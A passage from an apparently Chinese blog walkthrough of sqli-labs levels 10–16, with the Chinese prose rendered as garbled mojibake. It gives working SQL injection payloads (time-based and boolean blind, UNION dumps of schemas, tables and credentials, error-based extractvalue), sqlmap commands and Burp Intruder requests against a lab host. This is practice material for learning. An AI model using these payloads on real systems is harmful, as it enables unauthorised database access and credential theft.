å€¼å°±å¯ä»¥å§å½“å‰æ•°æ®åå¼„å‡ºæ¥äº†ï¼š</p><table><thead><tr><th>request</th><th>payload1</th><th>payload2</th><th>status</th><th>timeout</th><th>error</th><th>length</th><th></th></tr></thead><tbody><tr><td>0</td><td></td><td></td><td>200</td><td>false</td><td>false</td><td>988</td><td></td></tr><tr><td>787</td><td>3</td><td>99</td><td>200</td><td>false</td><td>false</td><td>988</td><td></td></tr><tr><td>802</td><td>2</td><td>101</td><td>200</td><td>false</td><td>false</td><td>988</td><td></td></tr><tr><td>838</td><td>6</td><td>105</td><td>200</td><td>false</td><td>false</td><td>988</td><td></td></tr><tr><td>909</td><td>5</td><td>114</td><td>200</td><td>false</td><td>false</td><td>988</td><td></td></tr><tr><td>913</td><td>1</td><td>115</td><td>200</td><td>false</td><td>false</td><td>988</td><td></td></tr><tr><td>927</td><td>7</td><td>116</td><td>200</td><td>false</td><td>false</td><td>988</td><td></td></tr><tr><td>932</td><td>4</td><td>117</td><td>200</td><td>false</td><td>false</td><td>988</td><td></td></tr><tr><td>968</td><td>8</td><td>121</td><td>200</td><td>false</td><td>false</td><td>988</td><td></td></tr><tr><td>1</td><td>1</td><td>1</td><td>200</td><td>false</td><td>false</td><td>951</td><td></td></tr><tr><td>2</td><td>2</td><td>1</td><td>200</td><td>false</td><td>false</td><td>951</td><td></td></tr><tr><td>3</td><td>3</td><td>1</td><td>200</td><td>false</td><td>false</td><td>951</td><td></td></tr><tr><td>4</td><td>4</td><td>1</td><td>200</td><td>false</td><td>false</td><td>951</td><td></td></tr></tbody></table><h2 id="æ€»ç»“-9"><a class="markdownIt-Anchor" href="#æ€»ç»“-9">#</a> æ€»ç»“</h2><p>å…¶å®æƒ³èŠ‚çœæ—¶é—´å¯ä»¥å»çœ‹æ•°æ®åº“çš„å‘½åè§„èŒƒï¼Œç¡®å®šè¦æµ‹è¯•çš„å­—ç¬¦æœ‰å“ªäº›ï¼Œè¿™æ ·åœ¨è¿›è¡Œå¤§é‡æ•°æ®æµ‹è¯•çš„æ—¶å€™ä¼šèŠ‚çœä¸€äº›æ—¶é—´</p><hr><h1 id="less-10"><a class="markdownIt-Anchor" href="#less-10">#</a> Less-10</h1><p>dateï¼š2020-11-21 15:55:10</p><h2 id="è¿‡ç¨‹-10"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-10">#</a> è¿‡ç¨‹</h2><h3 id="sqlmap-10"><a class="markdownIt-Anchor" href="#sqlmap-10">#</a> sqlmap</h3><p>åŒ less-1</p><h3 id="æ‰‹å·¥æ³¨å…¥-10"><a class="markdownIt-Anchor" href="#æ‰‹å·¥æ³¨å…¥-10">#</a> æ‰‹å·¥æ³¨å…¥</h3><p>å’Œ less-9 ç›¸æ¯”å°±æ˜¯å•å¼•å·é—­åˆå˜æˆäº†åŒå¼•å·é—­åˆ</p><p>ç”¨è¿™ä¸ª payloadï¼ŒæœåŠ¡å™¨å°±ç¡è§‰å•¦ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.sqli-labs.com/Less-10?id=1&quot; and if((1=1),sleep(2333),1) %23+</span><br></pre></td></tr></table></figure><p>åé¢çš„æµç¨‹å’Œ less-9 ä¸€æ ·</p><h2 id="æ€»ç»“-10"><a class="markdownIt-Anchor" href="#æ€»ç»“-10">#</a> æ€»ç»“</h2><p>é‡åˆ°è¿™ä¸ªé¢˜ç›®ä¹Ÿä¸çŸ¥é“æ˜¯è¯¥å¼€å¿ƒè¿˜æ˜¯è¯¥å¼€å¿ƒ</p><hr><h1 id="less-11"><a class="markdownIt-Anchor" href="#less-11">#</a> Less-11</h1><p>dateï¼š2020-11-21 16:23:25</p><h2 id="è¿‡ç¨‹-11"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-11">#</a> è¿‡ç¨‹</h2><p>å†™å®Œæ—¶é—´ç›²æ³¨çš„æˆ‘ï¼Œçœ‹è§è¿™é“é¢˜ç›®ï¼Œçœ¼å‰ä¸€äº®ï¼ç»ˆäºæ¢é¢˜ç›®å•¦å“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå—</p><h3 id="sqlmap-11"><a class="markdownIt-Anchor" href="#sqlmap-11">#</a> sqlmap</h3><p>sqlmap æµ‹ post è¯·æ±‚å¯ä»¥ç”¨å‚æ•° forms</p><p>è¿™é‡Œç”¨çš„â€“forms å‚æ•°ï¼Œç›´æ¥æåˆ°æ‰€æœ‰æ•°æ®åº“äº†ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py sqlmap.py -u http://www.sqli-labs.com/Less-11 --forms --dbs --batch</span><br></pre></td></tr></table></figure><p>åé¢çˆ†å­—æ®µå€¼æ”¹å‚æ•°å°±å¯ä»¥äº†ï¼ŒåŒ less-1</p><h3 id="æ‰‹å·¥æ³¨å…¥-11"><a class="markdownIt-Anchor" href="#æ‰‹å·¥æ³¨å…¥-11">#</a> æ‰‹å·¥æ³¨å…¥</h3><p>çœ‹è§ç™»å½•æ¡†å°±æƒ³ admin/123456 ç™»å½•ï¼ˆç«Ÿç„¶å¤±è´¥äº†ï¼æ°”äººï¼ï¼‰</p><p>æŠ“åŒ…çœ‹è§çš„æ˜¯ post è¯·æ±‚ï¼Œæ‰€ä»¥ä¸èƒ½å’Œä¹‹å‰ä¸€æ ·ç›´æ¥åœ¨ url åé¢æ¥å‚æ•°äº†ï¼Œé‚£å°±åœ¨è¾“å…¥æ¡†ç›´æ¥æ³¨å…¥å“ˆå“ˆå“ˆ</p><p>payloadï¼Œusername æœ€åé¢æœ‰ä¸ªç©ºæ ¼ï¼Œä¸åŠ ç©ºæ ¼æ³¨é‡Šç¬¦å·å’Œåé¢çš„ç¬¦å·è¿æ¥åœ¨ä¸€èµ·ï¼Œå°±èµ·ä¸åˆ°æ³¨é‡Šçš„åŠŸèƒ½å•¦:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Username :    admin&#x27; or 1=1 -- Password :    123456</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your Login name:DumbYour Password:Dumb</span><br></pre></td></tr></table></figure><p>æœ‰æ•°æ®å›æ˜¾ï¼Œèˆ’æœäº†</p><p>ä¸Š bp æŠ“åŒ…ï¼Œç›´æ¥æ”¹åé¢çš„å‚æ•°ï¼Œæ ¹æ® order by ç¡®å®šéœ€è¦ä¸¤ä¸ªå­—æ®µï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST /Less-11/ HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://www.sqli-labs.com/Less-11/Content-Type: application/x-www-form-urlencodedContent-Length: 51Origin: http://www.sqli-labs.comDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheuname=admin%27 order by 2+--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼Œç«Ÿç„¶çœŸçš„æœ‰ä¸€ä¸ª admin/adminâ€¦ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;br&gt;Your Login name:admin&lt;br&gt;Your Password:admin&lt;br&gt;</span><br></pre></td></tr></table></figure><p>çˆ†æ•°æ®åº“ payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=zhatian%27 union select 1,group_concat(schema_name) from information_schema.schemata+--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;br&gt;Your Login name:1&lt;br&gt;Your Password:information_schema,bookstore,challenges,dvwa,edusys,exam,fresh,hotel,hy,hy2,mysql,news,pentest,performance_schema,pikachu,security,store,student,test,vote&lt;br&gt;</span><br></pre></td></tr></table></figure><p>çˆ†è¡¨ payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=zhatian%27 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()+--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;br&gt;Your Login name:1&lt;br&gt;Your Password:emails,referers,uagents,users&lt;br</span><br></pre></td></tr></table></figure><p>çˆ†å­—æ®µ:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=zhatian%27 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;+--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;br&gt;Your Login name:1&lt;br&gt;Your Password:user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password,level,id,username,password&lt;br&gt;</span><br></pre></td></tr></table></figure><p>çˆ†å­—æ®µå€¼:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=zhatian%27 union select 1,group_concat(concat_ws(&#x27;--&#x27;,username,password)) from users +--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;br&gt;Your Login name:1&lt;br&gt;Your Password:Dumb--Dumb,Angelina--I-kill-you,Dummy--p@ssword,secure--crappy,stupid--stupidity,superman--genious,batman--mob!le,admin--admin,admin1--admin1,admin2--admin2,admin3--admin3,dhakkan--dumbo,admin4--admin4&lt;br</span><br></pre></td></tr></table></figure><p>åé¢çš„éƒ½æ˜¯å¸¸è§„æ“ä½œäº†</p><h2 id="æ€»ç»“-11"><a class="markdownIt-Anchor" href="#æ€»ç»“-11">#</a> æ€»ç»“</h2><p>sqlmap æµ‹ post è¯·æ±‚å¯ä»¥ç”¨å‚æ•° formsï¼Œç›´æ¥è·å–è¡¨å•ï¼Œå¯ä»¥ä½¿ç”¨ - r å‚æ•°è¯»å–è¯·æ±‚æ–‡ä»¶ï¼Œæˆ–è€…é€šè¿‡â€“data å‚æ•°æµ‹è¯•ï¼Œå…·ä½“æƒ…å†µå…·ä½“ç™¾åº¦</p><p>-r è¯»å–çš„æ–‡ä»¶å¯ä»¥ç”¨ bp æŠ“åŒ…ï¼Œå³é”® copy to fileï¼Œç›´æ¥å¯¼å‡º txt æ–‡ä»¶</p><hr><h1 id="less-12"><a class="markdownIt-Anchor" href="#less-12">#</a> Less-12</h1><h2 id="è¿‡ç¨‹-12"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-12">#</a> è¿‡ç¨‹</h2><p>dateï¼š2020-11-21 17:21:22</p><h3 id="sqlmap-12"><a class="markdownIt-Anchor" href="#sqlmap-12">#</a> sqlmap</h3><p>åŒ less-11</p><h3 id="æ‰‹å·¥æ³¨å…¥-12"><a class="markdownIt-Anchor" href="#æ‰‹å·¥æ³¨å…¥-12">#</a> æ‰‹å·¥æ³¨å…¥</h3><p>ä¸Š bp æŠ“åŒ…</p><p>å‘ç°åŒå¼•å·æŠ¥é”™ï¼Œpayloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&quot;+or+1%3D1+--+&amp;passwd=1234&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27; at line 1</span><br></pre></td></tr></table></figure><p>æˆ‘ï¼Ÿï¼Ÿï¼Ÿ</p><p>ç”Ÿæ°”çš„ä¹±æäº†:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&quot;5678+or+1%3D1+--+&amp;passwd=1234&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;5678 or 1=1 -- &quot;) and password=(&quot;1234&quot;) LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure><p>è¿™ä¸‹å‡ºæ¥äº†æŠŠï¼Œåé¢æ˜¯ &quot;)ï¼Œå†åŠ ä¸ªæ‹¬å·é—­åˆä¸€ä¸‹ä¸‹ï¼Œåˆ†åˆ« order by2 å’Œ 3ï¼Œç¡®å®šæ˜¯ä¸¤ä¸ªå­—æ®µ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin123455&quot;)+order by 3--+&amp;passwd=1234&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>è¾“å‡ºå½“å‰æ•°æ®åº“ï½</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin123455&quot;)+union select 1,database()--+&amp;passwd=1234&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;br&gt;Your Login name:1&lt;br&gt;Your Password:security&lt;br&gt;</span><br></pre></td></tr></table></figure><p>åç»­æ“ä½œå‚è€ƒ less-11</p><h2 id="æ€»ç»“-12"><a class="markdownIt-Anchor" href="#æ€»ç»“-12">#</a> æ€»ç»“</h2><p>å’Œä¸Šä¸€å…³æ¯”å°±æ˜¯å•å¼•å·é—­åˆå˜æˆ &quot;) é—­åˆäº†ï¼Œå’Œå‰é¢åå…³åšçš„é¢˜ç›®ä¸€æ ·å‘€ï¼Œåé¢ä¸ä¼šè¿˜æ˜¯ä¸€æ ·çš„å§ï¼Œç„¶åå†™å®Œç›²æ³¨å°±æ²¡äº†æŠŠ</p><p>å”‰ï¼Œæˆ‘è§‰å¾—æˆ‘çš„ä¸“æ³¨åŠ›æœ‰ç‚¹ä¸å¤ªå¤Ÿï¼Œæ‰å†™äº†å‡ é“é¢˜å•Šï¼Œè¿˜èŠ±äº†è¿™ä¹ˆé•¿æ—¶é—´ï¼ŒçœŸæ˜¯åºŸç‰©</p><hr><h1 id="less-13"><a class="markdownIt-Anchor" href="#less-13">#</a> Less-13</h1><p>dateï¼š2020-11-21 18:08:01</p><h2 id="è¿‡ç¨‹-13"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-13">#</a> è¿‡ç¨‹</h2><h3 id="sqlmap-13"><a class="markdownIt-Anchor" href="#sqlmap-13">#</a> sqlmap</h3><p>åŒ less-11</p><h3 id="æ‰‹å·¥æ³¨å…¥-13"><a class="markdownIt-Anchor" href="#æ‰‹å·¥æ³¨å…¥-13">#</a> æ‰‹å·¥æ³¨å…¥</h3><p>ç›²çŒœè¿™é¢˜æ˜¯ ')) é—­åˆï¼Œpayloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin%27%29%29+or+1%3D1+--+23&amp;passwd=32&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;) or 1=1 -- 23&#x27;) and password=(&#x27;32&#x27;) LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure><p>å“¦è±ï¼Œæ˜¯ ') é—­åˆï¼Œç”Ÿæ°”ï¼é—­åˆï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27;) or 1=1+--+23&amp;passwd=32&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>è¾“å‡ºåªæœ‰ä¸€å¼ å›¾ç‰‡ï¼Œè¡¨ç¤ºé—­åˆæˆåŠŸï¼Œæ²¡æœ‰æ•°æ®å›æ˜¾</p><p>é‚£å°±ç”¨æŠ¥é”™æ¥çœ‹æ•°æ®å‘—ï¼Œæ­£å¥½æŠ¥é”™æ³¨å…¥çš„å‡½æ•°æˆ‘ç”¨çš„å°‘</p><p>extractvalue (ç›®æ ‡ xml æ–‡æ¡£ï¼Œxml è·¯å¾„) ç”¨äºæŸ¥è¯¢ xml æ–‡ä»¶</p><p>ç¬¬äºŒä¸ªå‚æ•° xml ä¸­çš„ä½ç½®æ˜¯å¯æ“ä½œçš„åœ°æ–¹ï¼Œxml æ–‡æ¡£ä¸­æŸ¥æ‰¾å­—ç¬¦ä½ç½®æ˜¯ç”¨ /xxx/xxx/xxx/â€¦ è¿™ç§æ ¼å¼ï¼Œå¦‚æœæˆ‘ä»¬å†™å…¥å…¶ä»–æ ¼å¼ï¼Œå°±ä¼šæŠ¥é”™ï¼Œå¹¶ä¸”ä¼šè¿”å›æˆ‘ä»¬å†™å…¥çš„éæ³•æ ¼å¼å†…å®¹ï¼Œè€Œè¿™ä¸ªéæ³•çš„å†…å®¹å°±æ˜¯æˆ‘ä»¬æƒ³è¦æŸ¥è¯¢çš„å†…å®¹</p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27;) and extractvalue(1,concat(&#x27;~&#x27;,database()))+--+23&amp;passwd=32&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>è¾“å‡ºå¾—åˆ°å½“å‰æ•°æ®åº“åï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#x27;~security</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ«çš„æ•°æ®åœ¨ xml è·¯å¾„é‚£é‡Œæ”¹ payload å³å¯ï¼Œå‚è€ƒ less-11</p><h2 id="æ€»ç»“-13"><a class="markdownIt-Anchor" href="#æ€»ç»“-13">#</a> æ€»ç»“</h2><p><a href="https://www.cnblogs.com/wocalieshenmegui/p/5917967.html">åç§ sql æŠ¥é”™æ³¨å…¥å§¿åŠ¿æ€»ç»“</a></p><hr><h1 id="less-14"><a class="markdownIt-Anchor" href="#less-14">#</a> Less-14</h1><p>dateï¼š2020-11-21 19:47:21</p><h2 id="è¿‡ç¨‹-14"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-14">#</a> è¿‡ç¨‹</h2><h3 id="sqlmap-14"><a class="markdownIt-Anchor" href="#sqlmap-14">#</a> sqlmap</h3><p>åŒ less-11</p><h3 id="æ‰‹å·¥æ³¨å…¥-14"><a class="markdownIt-Anchor" href="#æ‰‹å·¥æ³¨å…¥-14">#</a> æ‰‹å·¥æ³¨å…¥</h3><p>ç›´æ¥åŒå¼•å·é—­åˆäº†ï¼Œpayloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&quot; order by 666+--+&amp;passwd=123&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Unknown column &#x27;666&#x27; in &#x27;order clause&#x27;</span><br></pre></td></tr></table></figure><p>èƒ½é—­åˆäº†å°±éšä¾¿ç”¨ä¹‹å‰çš„å“ªä¸ªæ–¹æ³•æ‹¿æ•°æ®éƒ½å¯ä»¥å•¦ï¼Œç”¨æŠ¥é”™æ³¨å…¥æ‹¿ä¸ªæ•°æ®åº“åï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&quot; and extractvalue(1,concat(&#x27;~&#x27;,database()))+--+&amp;passwd=123&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#x27;~security&#x27;</span><br></pre></td></tr></table></figure><p>åˆ«çš„åŒ Less-11</p><h2 id="æ€»ç»“-14"><a class="markdownIt-Anchor" href="#æ€»ç»“-14">#</a> æ€»ç»“</h2><p>è¿™ï¼Œæ²¡å•¥</p><hr><h1 id="less-15"><a class="markdownIt-Anchor" href="#less-15">#</a> Less-15</h1><p>dateï¼š2020-11-21 20:03:27</p><h2 id="è¿‡ç¨‹-15"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-15">#</a> è¿‡ç¨‹</h2><h3 id="sqlmap-15"><a class="markdownIt-Anchor" href="#sqlmap-15">#</a> sqlmap</h3><p>åŒ less-11</p><h3 id="æ‰‹å·¥æ³¨å…¥-15"><a class="markdownIt-Anchor" href="#æ‰‹å·¥æ³¨å…¥-15">#</a> æ‰‹å·¥æ³¨å…¥</h3><p>çœ‹æ ‡é¢˜ï¼Œå¸ƒå°”ç›²æ³¨ï¼Œè¡Œå­ï¼Œä¸Š bp æŠ“åŒ…</p><p>å•å¼•å·é—­åˆåæ¥ order by 2ï¼Œç»™çš„æ˜¯ flag.jpg</p><p>æ¥ order by 2ï¼Œç»™çš„æ˜¯ slap.jpg</p><p>æ˜æ˜¾ flag.jpg çš„å°±æ˜¯ç™»é™†æˆåŠŸå˜›</p><p>è¯´æ˜å•å¼•å·é—­åˆæˆåŠŸä¸”éœ€è¦çš„æ˜¯ä¸¤ä¸ªå­—æ®µï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27; order by 3+--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>è¿˜æ˜¯å…ˆåˆ©ç”¨ if åˆ¤æ–­ï¼ŒæŠŠæ•°æ®åº“åå­—é•¿åº¦æå‡ºæ¥ï¼Œåˆ©ç”¨ä¸€ä¸‹ payloadï¼ŒæœåŠ¡å™¨æ²‰ç¡äº†å¥½ä¸€ä¼šæ‰é†’æ¥ï¼Œé‚£ä¹ˆé•¿åº¦å°±æ˜¯ 8 å•¦ï¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27; and if( length(database())=8,sleep(23),1 )+--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªä¸€ä¸ªå­—ç¬¦çŒœï¼Œè¿™ç§æ¬ç –çš„æ´»è¿˜æ˜¯äº¤ç»™ bp æŠŠ</p><p>å³é”® send to Intruderï¼Œattack type é€‰ cluster bomb:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST /Less-15/ HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://www.sqli-labs.com/Less-15/Content-Type: application/x-www-form-urlencodedContent-Length: 81Origin: http://www.sqli-labs.comDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheuname=admin&#x27; and if( ascii(substr(database(),Â§1Â§,1))=Â§8Â§,sleep(23),1 )+--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªå‚æ•°ä» 1-8ï¼Œç¬¬äºŒä¸ªå‚æ•°ä» 1-127ï¼Œæœ€åæ ¹æ® ascii å€¼æŠŠæ•°æ®åº“åæ‹–å‡ºæ¥ï¼Œçˆ†å­—æ®µå‚è€ƒ less-11</p><table><thead><tr><th>request</th><th>payload1</th><th>payload2</th><th>status</th><th>timeout</th><th>error</th><th>length</th><th></th></tr></thead><tbody><tr><td>787</td><td>3</td><td>99</td><td>200</td><td>false</td><td>false</td><td>1691</td><td></td></tr><tr><td>802</td><td>2</td><td>101</td><td>200</td><td>false</td><td>false</td><td>1691</td><td></td></tr><tr><td>838</td><td>6</td><td>105</td><td>200</td><td>false</td><td>false</td><td>1691</td><td></td></tr><tr><td>909</td><td>5</td><td>114</td><td>200</td><td>false</td><td>false</td><td>1691</td><td></td></tr><tr><td>913</td><td>1</td><td>115</td><td>200</td><td>false</td><td>false</td><td>1691</td><td></td></tr><tr><td>927</td><td>7</td><td>116</td><td>200</td><td>false</td><td>false</td><td>1691</td><td></td></tr><tr><td>932</td><td>4</td><td>117</td><td>200</td><td>false</td><td>false</td><td>1691</td><td></td></tr><tr><td>968</td><td>8</td><td>121</td><td>200</td><td>false</td><td>false</td><td>1691</td><td></td></tr><tr><td>0</td><td></td><td></td><td>200</td><td>false</td><td>false</td><td>1737</td><td></td></tr><tr><td>2</td><td>2</td><td>1</td><td>200</td><td>false</td><td>false</td><td>1737</td><td></td></tr><tr><td>1</td><td>1</td><td>1</td><td>200</td><td>false</td><td>false</td><td>1737</td><td></td></tr><tr><td>3</td><td>3</td><td>1</td><td>200</td><td>false</td><td>false</td><td>1737</td><td></td></tr></tbody></table><h2 id="æ€»ç»“-15"><a class="markdownIt-Anchor" href="#æ€»ç»“-15">#</a> æ€»ç»“</h2><hr><h1 id="less-16"><a class="markdownIt-Anchor" href="#less-16">#</a> Less-16</h1><p>dateï¼š2020-11-21 22:33:47</p><h2 id="è¿‡ç¨‹-16"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-16">#</a> è¿‡ç¨‹</h2><h3 id="sqlmap-16"><a class="markdownIt-Anchor" href="#sqlmap-16">#</a> sqlmap</h3><p>åŒ less-11</p><h3 id="æ‰‹å·¥æ³¨å…¥-16"><a class="markdownIt-Anchor" href="#æ‰‹å·¥æ³¨å…¥-16">#</a> æ‰‹å·¥æ³¨å…¥</h3><p>username è¾“å…¥ <code>admin&quot;) or 1=1 -- </code> ç›´æ¥ç™»å½•æˆåŠŸï¼Œä¸è¦å¿˜è®°â€“åé¢çš„ç©ºæ ¼å“ˆ</p><p>å› ä¸ºå¯ä»¥æ ¹æ®å›¾ç‰‡çš„æ˜¾ç¤ºåˆ¤æ–­ï¼Œæ‰€ä»¥å…¶å®æ—¶é—´ç›²æ³¨è¿˜æ˜¯å¸ƒå°”ç›²æ³¨éƒ½æ˜¯å¯ä»¥çš„å‘€ï¼Œåªæ˜¯å‰é¢é‚£é“é¢˜ç”¨è¿‡å¸ƒå°”ç›²æ³¨äº†ï¼Œè¿™é‡Œå°±ç”¨æ—¶é—´ç›²æ³¨</p><p>è€è§„çŸ©å…ˆåˆ¤æ–­æ•°æ®åº“é•¿åº¦æ˜¯ 8ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&quot;) and length(database())=8 -- </span><br></pre></td></tr></table></figure><p>ç„¶åæ¬ç –æ‰¾ bpï¼Œsend to Intruderï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST /Less-16/ HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://www.sqli-labs.com/Less-16/Content-Type: application/x-www-form-urlencodedContent-Length: 78Origin: http://www.sqli-labs.comDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheunameadmin&quot;) and if(ascii(substr(database(),Â§1Â§,1))=Â§8Â§,slepp(23),1)--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªå‚æ•°ä» 1-8ï¼Œç¬¬äºŒä¸ªå‚æ•°ä» 1-127ï¼Œæœ€åæ ¹æ® ascii 